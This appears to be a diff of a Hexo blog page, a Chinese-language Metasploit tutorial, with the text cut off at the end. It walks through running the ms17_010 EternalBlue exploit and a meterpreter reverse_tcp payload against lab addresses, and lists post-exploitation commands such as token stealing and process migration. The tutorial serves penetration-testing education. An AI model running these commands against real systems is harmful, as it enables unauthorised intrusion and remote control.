@@ -7,8 +7,8 @@
 
 <head>
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
-  <link rel="icon" href="/img/fluid.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="../../../../../img/fluid.png">
+  <link rel="icon" href="../../../../../img/fluid.png">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
@@ -16,18 +16,17 @@
   <meta name="author" content="iDea">
   <meta name="keywords" content="">
   
-    <meta name="description" content="前言msf是后渗透神奇，在kali中已经内置有。 1.1 基础使用metasploit程序需要使用postgresql数据库 1234567手动启动数据库：service postgresql start设置成开机启动数据库：systemctl enable postgresql 启动msf 1msfconsole  1.2.查找模块 12search 模块名&#x2F;&#x2F;比如我要找永恒之蓝 search">
+    <meta name="description" content="使用介绍基本使用metasploit程序需要使用postgresql数据库 1234567手动启动数据库：service postgresql start设置成开机启动数据库：systemctl enable postgresql 1.1基础命令123456789msfconsole										    #进入框架search  ms17_010">
 <meta property="og:type" content="article">
 <meta property="og:title" content="msf使用基础">
 <meta property="og:url" content="http://idea-oss.github.io/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/index.html">
 <meta property="og:site_name" content="iDea &#39;blog">
-<meta property="og:description" content="前言msf是后渗透神奇，在kali中已经内置有。 1.1 基础使用metasploit程序需要使用postgresql数据库 1234567手动启动数据库：service postgresql start设置成开机启动数据库：systemctl enable postgresql 启动msf 1msfconsole  1.2.查找模块 12search 模块名&#x2F;&#x2F;比如我要找永恒之蓝 search">
+<meta property="og:description" content="使用介绍基本使用metasploit程序需要使用postgresql数据库 1234567手动启动数据库：service postgresql start设置成开机启动数据库：systemctl enable postgresql 1.1基础命令123456789msfconsole										    #进入框架search  ms17_010">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://idea-oss.github.io/img/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80.png">
 <meta property="article:published_time" content="2022-06-14T17:41:39.000Z">
-<meta property="article:modified_time" content="2022-06-15T05:38:30.188Z">
+<meta property="article:modified_time" content="2024-01-08T01:31:40.447Z">
 <meta property="article:author" content="iDea">
-<meta property="article:tag" content="内网安全">
 <meta property="article:tag" content="msf">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://idea-oss.github.io/img/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80.png">
@@ -58,12 +57,12 @@
 <link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
 
 
-<link  rel="stylesheet" href="/css/main.css" />
+<link  rel="stylesheet" href="../../../../../css/main.css" />
 
 
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  <link id="highlight-css" rel="stylesheet" href="../../../../../css/highlight.css" />
   
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+    <link id="highlight-css-dark" rel="stylesheet" href="../../../../../css/highlight-dark.css" />
   
 
 
@@ -79,8 +78,8 @@
       Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
     }
   </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
+  <script  src="../../../../../js/utils.js" ></script>
+  <script  src="../../../../../js/color-schema.js" ></script>
 
   
 <meta name="generator" content="Hexo 6.2.0"></head>
@@ -95,7 +94,7 @@
 <div class="header-inner" style="height: 85vh;">
   <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
-    <a class="navbar-brand" href="/">
+    <a class="navbar-brand" href="../../../../../index.html">
       <strong>iDea</strong>
     </a>
 
@@ -114,7 +113,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/">
+              <a class="nav-link" href="../../../../../index.html">
                 <i class="iconfont icon-home-fill"></i>
                 首页
               </a>
@@ -126,7 +125,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/archives/">
+              <a class="nav-link" href="../../../../../archives/">
                 <i class="iconfont icon-archive-fill"></i>
                 归档
               </a>
@@ -138,7 +137,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/categories/">
+              <a class="nav-link" href="../../../../../categories/">
                 <i class="iconfont icon-category-fill"></i>
                 分类
               </a>
@@ -150,7 +149,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/tags/">
+              <a class="nav-link" href="../../../../../tags/">
                 <i class="iconfont icon-tags-fill"></i>
                 标签
               </a>
@@ -162,7 +161,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/about/">
+              <a class="nav-link" href="../../../../../about/">
                 <i class="iconfont icon-user-fill"></i>
                 关于
               </a>
@@ -191,7 +190,7 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('/./img/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80.png') no-repeat center center; background-size: cover;">
+     style="background: url('../../../../.././img/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80.png') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.5)">
       <div class="banner-text text-center fade-in-up">
@@ -220,7 +219,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.1k 字
+          9.8k 字
         
       </span>
     
@@ -231,7 +230,7 @@
         
         
         
-          10 分钟
+          82 分钟
         
       </span>
     
@@ -277,35 +276,165 @@
             
             <div class="markdown-body">
               
-              <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>msf是后渗透神奇，在kali中已经内置有。</p>
-<p><strong>1.1 基础使用</strong><br>metasploit程序需要使用postgresql数据库</p>
+              <h1 id="使用介绍"><a href="#使用介绍" class="headerlink" title="使用介绍"></a>使用介绍</h1><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><p>metasploit程序需要使用postgresql数据库</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">手动启动数据库：<br><br>service postgresql start<br><br>设置成开机启动数据库：<br><br>systemctl <span class="hljs-built_in">enable</span> postgresql<br></code></pre></td></tr></table></figure>
-<p>启动msf</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br></code></pre></td></tr></table></figure>
+<h5 id="1-1基础命令"><a href="#1-1基础命令" class="headerlink" title="1.1基础命令"></a>1.1基础命令</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole										    <span class="hljs-comment">#进入框架</span><br>search  ms17_010                                    <span class="hljs-comment"># 使用search命令查找相关漏洞</span><br>use exploit/windows/smb/ms17_010_eternalblue        <span class="hljs-comment"># 使用use进入模块</span><br>info     										    <span class="hljs-comment">#使用info查看模块信息</span><br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp    	<span class="hljs-comment">#设置攻击载荷</span><br>show options    									<span class="hljs-comment">#查看模块需要配置的参数</span><br><span class="hljs-built_in">set</span>  RHOST  192.168.100.158    					    <span class="hljs-comment">#设置参数</span><br>exploit / run     								    <span class="hljs-comment">#攻击</span><br>后渗透阶段											<span class="hljs-comment">#后渗透阶段</span><br></code></pre></td></tr></table></figure>
 
-<p><strong>1.2.查找模块</strong></p>
+<p><strong>1.2查找模块</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">search 模块名<br>//比如我要找永恒之蓝 search ms17_010<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210503215820762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>使用那个模块 use 模块名或use 前面的数字都可以<br><img src="https://img-blog.csdnimg.cn/20210503215928377.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210503215943473.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><strong>1.3使用模块</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看要设置的参数</span><br>show options<br><span class="hljs-comment">#查看模块详情</span><br>info<br><span class="hljs-comment">#设置载荷  有很多可以自行选择</span><br> <span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br><br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210503220943666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210503221039773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210503221406503.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183155173.png" srcset="/img/loading.gif" lazyload alt="image-20240107183155173"><br>使用那个模块 use 模块名或use 前面的数字都可以<br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183209746.png" srcset="/img/loading.gif" lazyload alt="image-20240107183209746"><br><strong>1.3使用模块</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看要设置的参数</span><br>show options<br><span class="hljs-comment">#查看模块详情</span><br>info<br><span class="hljs-comment">#设置载荷  有很多可以自行选择</span><br> <span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure>
+<p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183222015.png" srcset="/img/loading.gif" lazyload alt="image-20240107183222015"><br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183237763.png" srcset="/img/loading.gif" lazyload alt="image-20240107183237763"><br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183249768.png" srcset="/img/loading.gif" lazyload alt="image-20240107183249768"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#运行模块</span><br>run 或者 exploit<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210503221232981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210503221825545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><strong>1.4.命令行模式的一些基础操作</strong><br>输入help可以查看支持的操作，但是乱码了，莫慌，可以解决。<br><img src="https://img-blog.csdnimg.cn/20210503221939621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>输入 chcp 65001<br><img src="https://img-blog.csdnimg.cn/20210503222042627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>乱码没有了</p>
+<p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183300439.png" srcset="/img/loading.gif" lazyload alt="image-20240107183300439"><br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183309747.png" srcset="/img/loading.gif" lazyload alt="image-20240107183309747"><br><strong>1.4命令行模式的一些基础操作</strong><br>输入help可以查看支持的操作，但是乱码了，莫慌，可以解决。<br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183321088.png" srcset="/img/loading.gif" lazyload alt="image-20240107183321088"><br>输入 chcp 65001<br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183330992.png" srcset="/img/loading.gif" lazyload alt="image-20240107183330992"><br>乱码没有了</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">核心后台脚本：<br><br>		bgkill       关闭一个后台的meterpreter脚本<br><br>		bglist	   列出所有正在运行的后台脚本<br><br>		bgrun	   将一个meterpreter脚本以后台线程模式运行<br><br>		channel   显示或者控制一个活动频道<br><br>		close 		关闭一个频道<br><br>		<span class="hljs-built_in">exit</span>			终止meterpreter会话<br><br>		get_timeouts	获得当前会话的<span class="hljs-built_in">timeout</span>值<br><br>		getuid			查看当前权限<br><br>		<span class="hljs-built_in">help</span>			帮助菜单<br><br>		info 			显示post模块信息<br><br>		irb				进入ruby脚本模式<br><br>		load			加载meterpreter扩展<br><br>		migrate	   将会话迁移到一个指定PID的进程<br><br>		quit			 结束meterpreter会话<br><br>		<span class="hljs-built_in">read</span>			从频道中读取数据<br><br>		resource	运行文件中的命令<br><br>		run 			执行一个meterpreter脚本或者post模块<br><br>		sessions    快速地切换到另一个会话<br><br>		background	切换到后台<br><br>		run checkvm  查看是否是虚拟机<br><br>		steal_token 伪造身份<br><br></code></pre></td></tr></table></figure>
 
+<p>伪造身份：<br><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107183353523.png" srcset="/img/loading.gif" lazyload alt="image-20240107183353523"></p>
+<h4 id="正反向载荷"><a href="#正反向载荷" class="headerlink" title="正反向载荷"></a>正反向载荷</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">windows/meterpreter/bind_tcp       <span class="hljs-comment">#正向连接</span><br>windows/meterpreter/reverse_tcp    <span class="hljs-comment">#反向连接，常用</span><br>windows/meterpreter/reverse_http   <span class="hljs-comment">#通过监听80端口反向连接</span><br>windows/meterpreter/reverse_https  <span class="hljs-comment">#通过监听443端口反向连接</span><br></code></pre></td></tr></table></figure>
 
-<p>伪造身份：<br><img src="https://img-blog.csdnimg.cn/20210503222319828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><strong>2.1实战演示</strong></p>
-<p><img src="https://img-blog.csdnimg.cn/20210503223128117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h6 id="正向连接使用场景："><a href="#正向连接使用场景：" class="headerlink" title="正向连接使用场景："></a>正向连接使用场景：</h6><p>  我们的攻击机在内网环境，被攻击机是外网环境，由于被攻击机无法主动连接到我们的主机，所以就必须我们主动连接被攻击机了。但是这里经常遇到的问题是，被攻击机上开了防火墙，只允许访问指定的端口，比如被攻击机只对外开放了80端口。那么，我们就只能设置正向连接80端口了，这里很有可能失败，因为80端口上的流量太多了。</p>
+<h6 id="反向连接使用场景："><a href="#反向连接使用场景：" class="headerlink" title="反向连接使用场景："></a><strong><code>反向连接使用场景</code>：</strong></h6><p>  我们的主机和被攻击机都是在外网或者都是在内网，这样被攻击机就能主动连接到我们的主机了。如果是这样的情况，建议使用反向连接，因为反向连接的话，即使被攻击机开了防火墙也没事，防火墙只是阻止进入被攻击机的流量，而不会阻止被攻击机主动向外连接的流量。</p>
+<h4 id="各个模块"><a href="#各个模块" class="headerlink" title="各个模块"></a>各个模块</h4><ul>
+<li><h6 id="辅助模块-Auxiliary"><a href="#辅助模块-Auxiliary" class="headerlink" title="辅助模块(Auxiliary)"></a>辅助模块(Auxiliary)</h6><p>1、使用smb_ms17_010漏洞探测模块对smb_ms17_010漏洞进行探测：<br>命令: 可以 search auxiliary看有哪些模块</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use auxiliary/scanner/smb/smb_ms17_010<br></code></pre></td></tr></table></figure>
+
+<p>2、查看这个模块需要配置的信息：<br>命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">show options  <span class="hljs-comment">#查看这个模块需要配置的信息</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107204941011.png" srcset="/img/loading.gif" lazyload alt="image-20240107204941011"></p>
+<p>3、设置要探测的远程目标：</p>
+<p>注：RHOSTS 参数是要探测主机的ip或ip范围，我们探测一个ip范围内的主机是否存在漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> rhosts 192.168.100.100-192.168.100.190<br></code></pre></td></tr></table></figure>
+</li>
+<li><h6 id="攻击模块-exploit"><a href="#攻击模块-exploit" class="headerlink" title="攻击模块(exploit)"></a>攻击模块(exploit)</h6><p>1.使用某个攻击模块</p>
+<p>命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/smb/ms17_010_eternalblue<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107205127130.png" srcset="/img/loading.gif" lazyload alt="image-20240107205127130"></p>
+<p>2.查看这个漏洞的信息：<br>命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">info<br></code></pre></td></tr></table></figure>
+
+<p>3、查看可攻击的系统平台，显示当前攻击模块针对哪些特定操作系统版本、语言版本的系统：<br>命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">show target<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107205257010.png" srcset="/img/loading.gif" lazyload alt="image-20240107205257010"></p>
+</li>
+<li><h6 id="Payload攻击载荷模块"><a href="#Payload攻击载荷模块" class="headerlink" title="Payload攻击载荷模块"></a>Payload攻击载荷模块</h6><p>攻击载荷是我们期望在目标系统在被渗透攻击之后完成的实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令。</p>
+<p>1、查看攻击载荷：<br>命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">show  payloads  <span class="hljs-comment">#该命令可以查看当前漏洞利用模块下可用的所有Payload</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107205338130.png" srcset="/img/loading.gif" lazyload alt="image-20240107205338130"></p>
+<p>2、设置攻击载荷：<br>命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107205406374.png" srcset="/img/loading.gif" lazyload alt="image-20240107205406374"></p>
+<p>3、查看模块需要配置的参数：<br>命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">show  options<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107205441581.png" srcset="/img/loading.gif" lazyload alt="image-20240107205441581"></p>
+<p>4、设置攻击载荷参数：<br>命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> RHOST 192.168.100.158   <span class="hljs-comment">#设置RHOST，也就是要攻击主机的ip</span><br><span class="hljs-built_in">set</span> LHOST 192.168.100.132   <span class="hljs-comment">#设置LHOST，也就是我们主机的ip，用于接收从目标机弹回来的shell</span><br><span class="hljs-built_in">set</span> lport 6666              <span class="hljs-comment">#设置lport，也就是我们主机的端口，反弹shell到这个端口；如果我们这里不设置lport的话，默认是4444端口监听；</span><br></code></pre></td></tr></table></figure>
+
+<p>5、进行攻击：</p>
+<p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107205520019.png" srcset="/img/loading.gif" lazyload alt="image-20240107205520019"></p>
+</li>
+<li><h6 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h6><p>运行了<code>exploit命令</code>之后，我们开启了一个<code>reverse TCP监听器</code>来监听本地的<code>6666</code>端口，即我（攻击者）的本地主机地址（LHOST）和端口号（LPORT）。运行成功之后，我们将会看到命令提示符 <code>meterpreter &gt;</code> 出现：</p>
+<p><img src="/2022/06/15/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/msf%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80/image-20240107205700145.png" srcset="/img/loading.gif" lazyload alt="image-20240107205700145"></p>
+<p>Meterpreter的命令用法：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span 